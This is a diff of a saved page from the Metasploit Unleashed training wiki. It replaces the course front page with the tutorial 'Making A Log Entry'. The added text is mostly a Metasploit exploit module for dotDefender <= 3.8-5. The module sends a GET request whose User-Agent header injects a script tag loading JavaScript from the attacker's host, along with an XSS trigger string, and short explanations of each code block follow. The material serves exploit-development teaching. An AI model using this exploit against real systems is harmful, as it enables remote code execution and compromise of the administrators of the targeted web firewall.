@@ -2,7 +2,7 @@
 		<!DOCTYPE html>
 		<html xmlns="" xml:lang="en" lang="en" dir="ltr">
 		<head>
-			<title>Metasploit Unleashed</title>
+			<title>Making A Log Entry - Metasploit Unleashed</title>
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/reset.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/style.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/main.css" />
@@ -25,10 +25,10 @@
 						
 						<div id="controls">
 									<ul>
-			<li id="ca-nstab-main" class="selected"><a href="Port_Scanners" title="View the content page [c]" accesskey="c">Page</a></li>
-			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Main_Page&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
-			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
-			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
+			<li id="ca-nstab-main" class="selected"><a href="Making_A_Log_Entry" title="View the content page [c]" accesskey="c">Page</a></li>
+			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Making_A_Log_Entry&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
+			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Making_A_Log_Entry&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
+			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Making_A_Log_Entry&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
 		</ul>
 							
 							<div class="portlet" id="p-personal">
@@ -57,36 +57,317 @@
 						<a id="top"></a>
 						
 						<div id="content">
-							<h1>Metasploit Unleashed</h1>
+							<h1>Making A Log Entry</h1>
 						
 							<div id="siteSub">From Metasploit Unleashed</div>
 							<div id="contentSub"></div>
-																													<div id="jump-to-nav">Jump to: <a href="Port_Scanners#column-one">navigation</a>, <a href="Port_Scanners#searchInput">search</a></div>
+																													<div id="jump-to-nav">Jump to: <a href="Making_A_Log_Entry#column-one">navigation</a>, <a href="Making_A_Log_Entry#searchInput">search</a></div>
 														<!-- start content -->
-							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>This free information security training is brought to you in a community effort to promote awareness and raise funds for underprivileged children in East Africa. Through a heart-warming effort by several security professionals, we are proud to present the most complete and in-depth open course about the Metasploit Framework.
+							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>In this section we are going to take a look at sending a GET request to the target.  This GET request will contain a User-Agent field with Javascript appended to connect back to Metasploit.  The changes to the exploit are highlighed. 
 <br />
 <br />
 </p>
-<div class="center"><div class="floatnone"><a href="File:Msfu_logo_3.png" class="image"><img alt="Msfu logo 3.png" src="http://www.offensive-security.com/w/images/f/f6/Msfu_logo_3.png" width="632" height="319" /></a></div></div>
+<table id="toc" class="toc"><tr><td><div id="toctitle"><h2>Contents</h2></div>
+<ul>
+<li class="toclevel-1 tocsection-1"><a href="Making_A_Log_Entry#Register_Options"><span class="tocnumber">1</span> <span class="toctext">Register Options</span></a></li>
+<li class="toclevel-1 tocsection-2"><a href="Making_A_Log_Entry#Exploit_Get_Request"><span class="tocnumber">2</span> <span class="toctext">Exploit Get Request</span></a></li>
+<li class="toclevel-1 tocsection-3"><a href="Making_A_Log_Entry#Exploit_Headers"><span class="tocnumber">3</span> <span class="toctext">Exploit Headers</span></a></li>
+<li class="toclevel-1 tocsection-4"><a href="Making_A_Log_Entry#Exploit_Data"><span class="tocnumber">4</span> <span class="toctext">Exploit Data</span></a></li>
+<li class="toclevel-1 tocsection-5"><a href="Making_A_Log_Entry#Super"><span class="tocnumber">5</span> <span class="toctext">Super</span></a></li>
+</ul>
+</td></tr></table>
 <p><br />
+<pre>
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+#   http://metasploit.com/framework/
+##
+ 
+require 'msf/core'
+ 
+class Metasploit3 < Msf::Exploit::Remote
+    Rank = Average
+ 
+    include Msf::Exploit::Remote::HttpClient
+    include Msf::Exploit::Remote::HttpServer::HTML
+ 
+    def initialize(info={})
+        super(update_info(info,
+            'Name'           => "dotDefender <= 3.8-5 No Authentication Remote Code Execution Through XSS",
+            'Description'    => %q{
+                    This module exploits a vulnerability found in dotDefender.
+            },
+            'License'        => MSF_LICENSE,
+            'Author'         =>
+                [
+                    'John Dos',   #Initial remote execution discovery
+                    'rAWjAW'  	  #Everything else
+                ],
+            'References'     =>
+                [
+                    ['EDB', '14310'],
+                    ['URL', 'http://www.exploit-db.com/exploits/14310/']
+                ],
+            'Arch'           => ARCH_CMD,
+	   'Compat'          =>
+		{
+	            'PayloadType' => 'cmd'
+		},
+            'Platform'       => ['unix','linux'],
+            'Targets'        =>
+                [
+                    ['dotDefender <= 3.8-5', {}]
+                ],
+            'Privileged'     => false,
+            'DefaultTarget'  => 0))
+ 
+        register_options(
+            [
+             <span style='color:#ff0000;'>
+             OptString.new('TRIGGERLOG',  [true, 'This is what is used to trigger a log entry.','<script>alert(\'xss\')</script>']),
+	     OptString.new('SITENAME',  [true, 'This is usually the same as RHOST but is available as an option if different']),
+	     OptString.new('LHOST',  [true, 'This is the IP to connect back to for the javascript','0.0.0.0']),
+             OptString.new('URIPATH', [true, 'This is the URI path that will be created for the javascript hosted file','DotDefender.js']),
+             OptString.new('SRVPORT', [true, 'This is the port for the javascript to connect back to','80']),</span>
+            ], self.class)
+    	end
+
+
+	def exploit
+            <span style='color:#ff0000;'>resp = send_request_raw({
+	         'uri'     => "http://#{rhost}/",
+	         'version' => '1.1',
+	         'method' => 'GET',
+	         'headers' =>
+	            {
+	            'Content-Type' => 'application/x-www-form-urlencoded',
+                    'User-Agent' => "Mozilla Firefox &lt;script language=\"JavaScript\" src=\"http://#{datastore['lhost']}:#{datastore['SRVPORT']}/#{datastore['uripath']}\"&gt;&lt;/script&gt;",
+                    },
+                  'data' => "#{datastore['TRIGGERLOG']}"
+               })
+		
+           super </span>
+
+        end
+
+end
+</pre>
 <br />
-This is a free online course and if you enjoy it and find it useful, we ask that you make a donation to the HFC (Hackers For Charity), $9.00 will feed a child for a month, so any contribution is welcome. We hope you enjoy this course as much as we enjoyed making it.
 <br />
+</p>
+<h2> <span class="mw-headline" id="Register_Options"> Register Options </span></h2>
+<p><pre>
+OptString.new('TRIGGERLOG',  [true, 'This is what is used to trigger a log entry.','&lt;script&gt;alert(\'xss\')&lt;/script&gt;']),
+OptString.new('SITENAME',  [true, 'This is usually the same as RHOST but is available as an option if different'.'http://0.0.0.0/']),
+OptString.new('LHOST',  [true, 'This is the IP to connect back to for the javascript','0.0.0.0']),
+OptString.new('URIPATH', [true, 'This is the URI path that will be created for the javascript hosted file','DotDefender.js']),
+OptString.new('SRVPORT', [true, 'This is the port for the javascript to connect back to','80'])
+</pre>
+<br />
+<br />
+When creating our exploit we will need some additional options presented to the user and set some default values on required arguments.  We will have more context of these as we continue analyzing the exploit but these serve as a good reference to what purpose each has.  
+<br />
+<br />
+</p>
+<h2> <span class="mw-headline" id="Exploit_Get_Request"> Exploit Get Request </span></h2>
+<p><pre>
+resp = send_request_raw({
+	         'uri'     => "http://#{rhost}/",
+	         'version' => '1.1',
+	         'method' => 'GET',
+</pre>
+<br />
+<br />
+Here we are creating the exploit GET request that will host the User-Agent javascript.  We use the variable #{rhost} as the targeted machine.
+<br />
+<br />
+</p>
+<h2> <span class="mw-headline" id="Exploit_Headers"> Exploit Headers </span></h2>
+<p><pre>
+'headers' =>
+    {
+    'Content-Type' => 'application/x-www-form-urlencoded',
+    'User-Agent' => "Mozilla Firefox &lt;script language=\"JavaScript\" src=\"http://#{datastore['lhost']}:#{datastore['SRVPORT']}/#{datastore['uripath']}\"&gt;&lt;/script&gt;",
+     },
+</pre>
+<br />
+<br />
+This is where the main part of the exploit comes into play.  The variables SRVPORT, lhost, and uripath are used to allow as much customization and stealth as possible.
+<br />
+<br />
+</p>
+<h2> <span class="mw-headline" id="Exploit_Data"> Exploit Data </span></h2>
+<p><pre>
+'data' => "#{datastore['TRIGGERLOG']}"
+</pre>
+<br />
+<br />
+The above code will set the variable TRIGGERLOG to the data of the GET request so that we can actually trigger the log entry in the dotDefender software.
+<br />
+<br />
+</p>
+<h2> <span class="mw-headline" id="Super"> Super </span></h2>
+<p><pre>
+super
+</pre>
+<br />
+<br />
+The use of "super" will allow us to run both sets of code when the actual javascript server host is added in the next section.
+<br />
+<br />
+</p>
+<hr />
+<p><br />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total1"><a href="Web_App_Exploit_Dev" title="Web App Exploit Dev">Web App Exploit Dev</a> &gt; Making A Log Entry</div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total2"><a href="Installing_dotDefender" title="Installing dotDefender">Installing dotDefender</a> &#124; <a href="Analyzing_the_Exploit" title="Analyzing the Exploit">Analyzing the Exploit</a> &#124; <a href="Skeleton_Creation" title="Skeleton Creation">Skeleton Creation</a> &#124; <strong class="selflink">Making A Log Entry</strong> &#124; <a href="Hosting_the_Javascript" title="Hosting the Javascript">Hosting the Javascript</a> &#124; <a href="Final_Exploit" title="Final Exploit">Final Exploit</a></div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 </p>
 <!-- 
 NewPP limit report
-Preprocessor visited node count: 6/1000000
-Preprocessor generated node count: 20/1000000
-Post‐expand include size: 0/2097152 bytes
+Preprocessor visited node count: 576/1000000
+Preprocessor generated node count: 2755/1000000
+Post‐expand include size: 4082/2097152 bytes
 Template argument size: 0/2097152 bytes
-Highest expansion depth: 2/40
+Highest expansion depth: 3/40
 Expensive parser function count: 0/100
 -->
 
-<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:285-0!*!*!*!*!2!* and timestamp 20131123153816 -->
+<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:367-0!*!0!!en!*!* and timestamp 20131124115134 -->
 </div><div class="printfooter">
-Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597">http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597</a>"</div>
-							<div id='catlinks' class='catlinks catlinks-allhidden'></div>							<!-- end content -->
+Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Making_A_Log_Entry&amp;oldid=852">http://www.offensive-security.com/w/index.php?title=Making_A_Log_Entry&amp;oldid=852</a>"</div>
+							<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks" class="mw-normal-catlinks"><a href="Special:Categories" title="Special:Categories">Category</a>: <ul><li><a href="http://www.offensive-security.com/w/index.php?title=Category:Web_App_Exploit_Dev&amp;action=edit&amp;redlink=1" class="new" title="Category:Web App Exploit Dev (page does not exist)">Web App Exploit Dev</a></li></ul></div></div>							<!-- end content -->
 													</div>
 						
 					</div>
@@ -521,4 +802,4 @@ document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.
 <script type="text/javascript">
 var pageTracker = _gat._getTracker("UA-1981501-1");
 pageTracker._trackPageview();
-</script><!-- Served in 0.151 secs. --></body></html>
+</script><!-- Served in 0.129 secs. --></body></html>
